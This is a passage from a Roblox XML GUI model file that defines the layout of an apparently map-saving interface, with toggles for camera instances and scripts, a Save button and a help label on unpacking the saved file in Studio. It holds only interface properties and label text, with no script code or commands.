										<bool name="Draggable">false</bool>
										<token name="Font">3</token>
										<token name="FontSize">5</token>
										<string name="Name">OnBar</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>15</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<string name="Text"></string>
										<Color3 name="TextColor3">4279970357</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">14</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">1</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextLabel" referent="RBXCA9461D402EF4DEABE2FB0AFE4CD8BAC">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4278190080</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">true</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">3</token>
										<token name="FontSize">5</token>
										<string name="Name">Bar</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>-2</XO>
											<YS>0</YS>
											<YO>-2</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>10</XO>
											<YS>0</YS>
											<YO>19</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<string name="Text"></string>
										<Color3 name="TextColor3">4279970357</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">14</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">1</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
							</Item>
						</Item>
						<Item class="Frame" referent="RBXEC40614DF8C442AB90C41A9848FE1B76">
							<Properties>
								<bool name="Active">false</bool>
								<Vector2 name="AnchorPoint">
									<X>0</X>
									<Y>0</Y>
								</Vector2>
								<Color3 name="BackgroundColor3">4294967295</Color3>
								<float name="BackgroundTransparency">1</float>
								<Color3 name="BorderColor3">4279970357</Color3>
								<int name="BorderSizePixel">1</int>
								<bool name="ClipsDescendants">false</bool>
								<bool name="Draggable">false</bool>
								<string name="Name">CameraInstances</string>
								<Ref name="NextSelectionDown">null</Ref>
								<Ref name="NextSelectionLeft">null</Ref>
								<Ref name="NextSelectionRight">null</Ref>
								<Ref name="NextSelectionUp">null</Ref>
								<UDim2 name="Position">
									<XS>0</XS>
									<XO>0</XO>
									<YS>0</YS>
									<YO>180</YO>
								</UDim2>
								<float name="Rotation">0</float>
								<bool name="Selectable">false</bool>
								<Ref name="SelectionImageObject">null</Ref>
								<UDim2 name="Size">
									<XS>1</XS>
									<XO>0</XO>
									<YS>0</YS>
									<YO>60</YO>
								</UDim2>
								<token name="SizeConstraint">0</token>
								<token name="Style">0</token>
								<bool name="Visible">true</bool>
								<int name="ZIndex">1</int>
							</Properties>
							<Item class="TextLabel" referent="RBX777C0127163949E389B9018CD390F6EF">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4294967295</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">1</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<token name="Font">3</token>
									<token name="FontSize">6</token>
									<string name="Name">SName</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>10</XO>
										<YS>0</YS>
										<YO>0</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>1</XS>
										<XO>-20</XO>
										<YS>0</YS>
										<YO>30</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<string name="Text">Camera Instances</string>
									<Color3 name="TextColor3">4279970357</Color3>
									<bool name="TextScaled">false</bool>
									<float name="TextSize">18</float>
									<Color3 name="TextStrokeColor3">4278190080</Color3>
									<float name="TextStrokeTransparency">1</float>
									<float name="TextTransparency">0</float>
									<bool name="TextWrapped">false</bool>
									<token name="TextXAlignment">0</token>
									<token name="TextYAlignment">1</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
							</Item>
							<Item class="TextLabel" referent="RBX08D13C0332D3405FA22741C1853BAD5D">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4294967295</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">1</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<token name="Font">3</token>
									<token name="FontSize">6</token>
									<string name="Name">Status</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>60</XO>
										<YS>0</YS>
										<YO>30</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>0</XS>
										<XO>50</XO>
										<YS>0</YS>
										<YO>15</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<string name="Text">Off</string>
									<Color3 name="TextColor3">4279970357</Color3>
									<bool name="TextScaled">false</bool>
									<float name="TextSize">18</float>
									<Color3 name="TextStrokeColor3">4278190080</Color3>
									<float name="TextStrokeTransparency">1</float>
									<float name="TextTransparency">0</float>
									<bool name="TextWrapped">false</bool>
									<token name="TextXAlignment">0</token>
									<token name="TextYAlignment">1</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
							</Item>
							<Item class="TextButton" referent="RBXC2F357872D6147038F038B3365CD0865">
								<Properties>
									<bool name="Active">true</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<bool name="AutoButtonColor">true</bool>
									<Color3 name="BackgroundColor3">4292664540</Color3>
									<float name="BackgroundTransparency">0</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<token name="Font">3</token>
									<token name="FontSize">5</token>
									<bool name="Modal">false</bool>
									<string name="Name">Change</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>10</XO>
										<YS>0</YS>
										<YO>30</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">true</bool>
									<bool name="Selected">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>0</XS>
										<XO>40</XO>
										<YS>0</YS>
										<YO>15</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<string name="Text"></string>
									<Color3 name="TextColor3">4279970357</Color3>
									<bool name="TextScaled">false</bool>
									<float name="TextSize">14</float>
									<Color3 name="TextStrokeColor3">4278190080</Color3>
									<float name="TextStrokeTransparency">1</float>
									<float name="TextTransparency">0</float>
									<bool name="TextWrapped">false</bool>
									<token name="TextXAlignment">2</token>
									<token name="TextYAlignment">1</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="TextLabel" referent="RBX32998A56BA4C41D7B8AD807F8F68372A">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4278227932</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">3</token>
										<token name="FontSize">5</token>
										<string name="Name">OnBar</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>15</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<string name="Text"></string>
										<Color3 name="TextColor3">4279970357</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">14</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">1</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextLabel" referent="RBX457D31EDA4104363BA51C29CD99F5C6C">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4278190080</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">true</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">3</token>
										<token name="FontSize">5</token>
										<string name="Name">Bar</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>-2</XO>
											<YS>0</YS>
											<YO>-2</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>10</XO>
											<YS>0</YS>
											<YO>19</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<string name="Text"></string>
										<Color3 name="TextColor3">4279970357</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">14</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">1</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
							</Item>
						</Item>
						<Item class="Frame" referent="RBX0886AE087E524B0287390685702574E0">
							<Properties>
								<bool name="Active">false</bool>
								<Vector2 name="AnchorPoint">
									<X>0</X>
									<Y>0</Y>
								</Vector2>
								<Color3 name="BackgroundColor3">4294967295</Color3>
								<float name="BackgroundTransparency">1</float>
								<Color3 name="BorderColor3">4279970357</Color3>
								<int name="BorderSizePixel">1</int>
								<bool name="ClipsDescendants">false</bool>
								<bool name="Draggable">false</bool>
								<string name="Name">Scripts</string>
								<Ref name="NextSelectionDown">null</Ref>
								<Ref name="NextSelectionLeft">null</Ref>
								<Ref name="NextSelectionRight">null</Ref>
								<Ref name="NextSelectionUp">null</Ref>
								<UDim2 name="Position">
									<XS>0</XS>
									<XO>0</XO>
									<YS>0</YS>
									<YO>0</YO>
								</UDim2>
								<float name="Rotation">0</float>
								<bool name="Selectable">false</bool>
								<Ref name="SelectionImageObject">null</Ref>
								<UDim2 name="Size">
									<XS>1</XS>
									<XO>0</XO>
									<YS>0</YS>
									<YO>60</YO>
								</UDim2>
								<token name="SizeConstraint">0</token>
								<token name="Style">0</token>
								<bool name="Visible">true</bool>
								<int name="ZIndex">1</int>
							</Properties>
							<Item class="TextLabel" referent="RBXC4B8FC618F8C47AE9045A46E79B5F1F3">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4294967295</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">1</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<token name="Font">3</token>
									<token name="FontSize">6</token>
									<string name="Name">SName</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>10</XO>
										<YS>0</YS>
										<YO>0</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>1</XS>
										<XO>-20</XO>
										<YS>0</YS>
										<YO>30</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<string name="Text">Save Scripts</string>
									<Color3 name="TextColor3">4279970357</Color3>
									<bool name="TextScaled">false</bool>
									<float name="TextSize">18</float>
									<Color3 name="TextStrokeColor3">4278190080</Color3>
									<float name="TextStrokeTransparency">1</float>
									<float name="TextTransparency">0</float>
									<bool name="TextWrapped">false</bool>
									<token name="TextXAlignment">0</token>
									<token name="TextYAlignment">1</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
							</Item>
							<Item class="TextLabel" referent="RBX5F75DC4CB107483EA89978374DFA078B">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4294967295</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">1</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<token name="Font">3</token>
									<token name="FontSize">6</token>
									<string name="Name">Status</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>60</XO>
										<YS>0</YS>
										<YO>30</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>0</XS>
										<XO>50</XO>
										<YS>0</YS>
										<YO>15</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<string name="Text">Off</string>
									<Color3 name="TextColor3">4279970357</Color3>
									<bool name="TextScaled">false</bool>
									<float name="TextSize">18</float>
									<Color3 name="TextStrokeColor3">4278190080</Color3>
									<float name="TextStrokeTransparency">1</float>
									<float name="TextTransparency">0</float>
									<bool name="TextWrapped">false</bool>
									<token name="TextXAlignment">0</token>
									<token name="TextYAlignment">1</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
							</Item>
							<Item class="TextButton" referent="RBX50D0FFD374EE4B96AA91B7A879E52EA6">
								<Properties>
									<bool name="Active">true</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<bool name="AutoButtonColor">true</bool>
									<Color3 name="BackgroundColor3">4292664540</Color3>
									<float name="BackgroundTransparency">0</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<token name="Font">3</token>
									<token name="FontSize">5</token>
									<bool name="Modal">false</bool>
									<string name="Name">Change</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>10</XO>
										<YS>0</YS>
										<YO>30</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">true</bool>
									<bool name="Selected">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>0</XS>
										<XO>40</XO>
										<YS>0</YS>
										<YO>15</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<string name="Text"></string>
									<Color3 name="TextColor3">4279970357</Color3>
									<bool name="TextScaled">false</bool>
									<float name="TextSize">14</float>
									<Color3 name="TextStrokeColor3">4278190080</Color3>
									<float name="TextStrokeTransparency">1</float>
									<float name="TextTransparency">0</float>
									<bool name="TextWrapped">false</bool>
									<token name="TextXAlignment">2</token>
									<token name="TextYAlignment">1</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="TextLabel" referent="RBX429FA613FD6C43AE815CAF67A78E8320">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4278227932</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">3</token>
										<token name="FontSize">5</token>
										<string name="Name">OnBar</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>15</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<string name="Text"></string>
										<Color3 name="TextColor3">4279970357</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">14</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">1</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextLabel" referent="RBXE0C27BF7C6F14F40B407CD00D5F226D2">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4278190080</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">true</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">3</token>
										<token name="FontSize">5</token>
										<string name="Name">Bar</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>-2</XO>
											<YS>0</YS>
											<YO>-2</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>10</XO>
											<YS>0</YS>
											<YO>19</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<string name="Text"></string>
										<Color3 name="TextColor3">4279970357</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">14</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">1</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
							</Item>
						</Item>
					</Item>
					<Item class="TextLabel" referent="RBX1E144EC0FFBE48D4AFC7270519ADD784">
						<Properties>
							<bool name="Active">false</bool>
							<Vector2 name="AnchorPoint">
								<X>0</X>
								<Y>0</Y>
							</Vector2>
							<Color3 name="BackgroundColor3">4288914085</Color3>
							<float name="BackgroundTransparency">1</float>
							<Color3 name="BorderColor3">4279970357</Color3>
							<int name="BorderSizePixel">1</int>
							<bool name="ClipsDescendants">false</bool>
							<bool name="Draggable">false</bool>
							<token name="Font">3</token>
							<token name="FontSize">6</token>
							<string name="Name">ToSave</string>
							<Ref name="NextSelectionDown">null</Ref>
							<Ref name="NextSelectionLeft">null</Ref>
							<Ref name="NextSelectionRight">null</Ref>
							<Ref name="NextSelectionUp">null</Ref>
							<UDim2 name="Position">
								<XS>0</XS>
								<XO>0</XO>
								<YS>0</YS>
								<YO>17</YO>
							</UDim2>
							<float name="Rotation">0</float>
							<bool name="Selectable">false</bool>
							<Ref name="SelectionImageObject">null</Ref>
							<UDim2 name="Size">
								<XS>1</XS>
								<XO>0</XO>
								<YS>0</YS>
								<YO>20</YO>
							</UDim2>
							<token name="SizeConstraint">0</token>
							<string name="Text">To Save</string>
							<Color3 name="TextColor3">4278190080</Color3>
							<bool name="TextScaled">false</bool>
							<float name="TextSize">18</float>
							<Color3 name="TextStrokeColor3">4278190080</Color3>
							<float name="TextStrokeTransparency">1</float>
							<float name="TextTransparency">0</float>
							<bool name="TextWrapped">false</bool>
							<token name="TextXAlignment">2</token>
							<token name="TextYAlignment">1</token>
							<bool name="Visible">true</bool>
							<int name="ZIndex">1</int>
						</Properties>
					</Item>
					<Item class="Frame" referent="RBX4A98EB86C30F401CA884D719AA4E8BFF">
						<Properties>
							<bool name="Active">false</bool>
							<Vector2 name="AnchorPoint">
								<X>0</X>
								<Y>0</Y>
							</Vector2>
							<Color3 name="BackgroundColor3">4294967295</Color3>
							<float name="BackgroundTransparency">0.800000012</float>
							<Color3 name="BorderColor3">4279970357</Color3>
							<int name="BorderSizePixel">1</int>
							<bool name="ClipsDescendants">false</bool>
							<bool name="Draggable">false</bool>
							<string name="Name">CopyList</string>
							<Ref name="NextSelectionDown">null</Ref>
							<Ref name="NextSelectionLeft">null</Ref>
							<Ref name="NextSelectionRight">null</Ref>
							<Ref name="NextSelectionUp">null</Ref>
							<UDim2 name="Position">
								<XS>0</XS>
								<XO>0</XO>
								<YS>0</YS>
								<YO>37</YO>
							</UDim2>
							<float name="Rotation">0</float>
							<bool name="Selectable">false</bool>
							<Ref name="SelectionImageObject">null</Ref>
							<UDim2 name="Size">
								<XS>1</XS>
								<XO>0</XO>
								<YS>0</YS>
								<YO>163</YO>
							</UDim2>
							<token name="SizeConstraint">0</token>
							<token name="Style">0</token>
							<bool name="Visible">true</bool>
							<int name="ZIndex">1</int>
						</Properties>
					</Item>
					<Item class="Frame" referent="RBXEF0058F1C1804F7E91EF8476883C437C">
						<Properties>
							<bool name="Active">false</bool>
							<Vector2 name="AnchorPoint">
								<X>0</X>
								<Y>0</Y>
							</Vector2>
							<Color3 name="BackgroundColor3">4293519849</Color3>
							<float name="BackgroundTransparency">0</float>
							<Color3 name="BorderColor3">4287993237</Color3>
							<int name="BorderSizePixel">1</int>
							<bool name="ClipsDescendants">false</bool>
							<bool name="Draggable">false</bool>
							<string name="Name">Bottom</string>
							<Ref name="NextSelectionDown">null</Ref>
							<Ref name="NextSelectionLeft">null</Ref>
							<Ref name="NextSelectionRight">null</Ref>
							<Ref name="NextSelectionUp">null</Ref>
							<UDim2 name="Position">
								<XS>0</XS>
								<XO>0</XO>
								<YS>1</YS>
								<YO>-50</YO>
							</UDim2>
							<float name="Rotation">0</float>
							<bool name="Selectable">false</bool>
							<Ref name="SelectionImageObject">null</Ref>
							<UDim2 name="Size">
								<XS>1</XS>
								<XO>0</XO>
								<YS>0</YS>
								<YO>50</YO>
							</UDim2>
							<token name="SizeConstraint">0</token>
							<token name="Style">0</token>
							<bool name="Visible">true</bool>
							<int name="ZIndex">1</int>
						</Properties>
						<Item class="TextLabel" referent="RBX1FE0333F436A4D37B52F79E0FFD1816C">
							<Properties>
								<bool name="Active">false</bool>
								<Vector2 name="AnchorPoint">
									<X>0</X>
									<Y>0</Y>
								</Vector2>
								<Color3 name="BackgroundColor3">4288914085</Color3>
								<float name="BackgroundTransparency">1</float>
								<Color3 name="BorderColor3">4279970357</Color3>
								<int name="BorderSizePixel">1</int>
								<bool name="ClipsDescendants">false</bool>
								<bool name="Draggable">false</bool>
								<token name="Font">3</token>
								<token name="FontSize">5</token>
								<string name="Name">TextLabel</string>
								<Ref name="NextSelectionDown">null</Ref>
								<Ref name="NextSelectionLeft">null</Ref>
								<Ref name="NextSelectionRight">null</Ref>
								<Ref name="NextSelectionUp">null</Ref>
								<UDim2 name="Position">
									<XS>0</XS>
									<XO>4</XO>
									<YS>0</YS>
									<YO>0</YO>
								</UDim2>
								<float name="Rotation">0</float>
								<bool name="Selectable">false</bool>
								<Ref name="SelectionImageObject">null</Ref>
								<UDim2 name="Size">
									<XS>1</XS>
									<XO>-4</XO>
									<YS>1</YS>
									<YO>0</YO>
								</UDim2>
								<token name="SizeConstraint">0</token>
								<string name="Text">After the map saves, open a new place on studio, then right click Lighting and &quot;Insert from file...&quot;, then select your file and run the unpacker script inside the folder.</string>
								<Color3 name="TextColor3">4278190080</Color3>
								<bool name="TextScaled">false</bool>
								<float name="TextSize">14</float>
								<Color3 name="TextStrokeColor3">4278190080</Color3>
								<float name="TextStrokeTransparency">1</float>
								<float name="TextTransparency">0</float>
								<bool name="TextWrapped">true</bool>
								<token name="TextXAlignment">0</token>
								<token name="TextYAlignment">0</token>
								<bool name="Visible">true</bool>
								<int name="ZIndex">1</int>
							</Properties>
						</Item>
					</Item>
					<Item class="TextButton" referent="RBXABCF49F3E2204B9B90441414E12B2A2F">
						<Properties>
							<bool name="Active">true</bool>
							<Vector2 name="AnchorPoint">
								<X>0</X>
								<Y>0</Y>
							</Vector2>
							<bool name="AutoButtonColor">true</bool>
							<Color3 name="BackgroundColor3">4293980400</Color3>
							<float name="BackgroundTransparency">0.800000012</float>
							<Color3 name="BorderColor3">4278190080</Color3>
							<int name="BorderSizePixel">1</int>
							<bool name="ClipsDescendants">false</bool>
							<bool name="Draggable">false</bool>
							<token name="Font">3</token>
							<token name="FontSize">6</token>
							<bool name="Modal">false</bool>
							<string name="Name">Save</string>
							<Ref name="NextSelectionDown">null</Ref>
							<Ref name="NextSelectionLeft">null</Ref>
							<Ref name="NextSelectionRight">null</Ref>
							<Ref name="NextSelectionUp">null</Ref>
							<UDim2 name="Position">
								<XS>0</XS>
								<XO>0</XO>
								<YS>1</YS>
								<YO>-80</YO>
							</UDim2>
							<float name="Rotation">0</float>
							<bool name="Selectable">true</bool>
							<bool name="Selected">false</bool>
							<Ref name="SelectionImageObject">null</Ref>
							<UDim2 name="Size">
								<XS>1</XS>
								<XO>0</XO>
								<YS>0</YS>
								<YO>30</YO>
							</UDim2>
							<token name="SizeConstraint">0</token>
							<token name="Style">0</token>
							<string name="Text">Save</string>
							<Color3 name="TextColor3">4279970357</Color3>
							<bool name="TextScaled">false</bool>
							<float name="TextSize">18</float>
							<Color3 name="TextStrokeColor3">4278190080</Color3>
							<float name="TextStrokeTransparency">1</float>
							<float name="TextTransparency">0</float>
							<bool name="TextWrapped">false</bool>
							<token name="TextXAlignment">2</token>
							<token name="TextYAlignment">1</token>
							<bool name="Visible">true</bool>
							<int name="ZIndex">1</int>
						</Properties>
					</Item>
					<Item class="TextBox" referent="RBX8B120933A11F405089BB7F621588BF66">
						<Properties>
							<bool name="Active">true</bool>
							<Vector2 name="AnchorPoint">
								<X>0</X>
								<Y>0</Y>
							</Vector2>
							<Color3 name="BackgroundColor3">4293980400</Color3>
							<float name="BackgroundTransparency">0.600000024</float>
							<Color3 name="BorderColor3">4279970357</Color3>
							<int name="BorderSizePixel">1</int>
							<bool name="ClearTextOnFocus">true</bool>
							<bool name="ClipsDescendants">false</bool>
							<bool name="Draggable">false</bool>
							<token name="Font">3</token>
							<token name="FontSize">6</token>
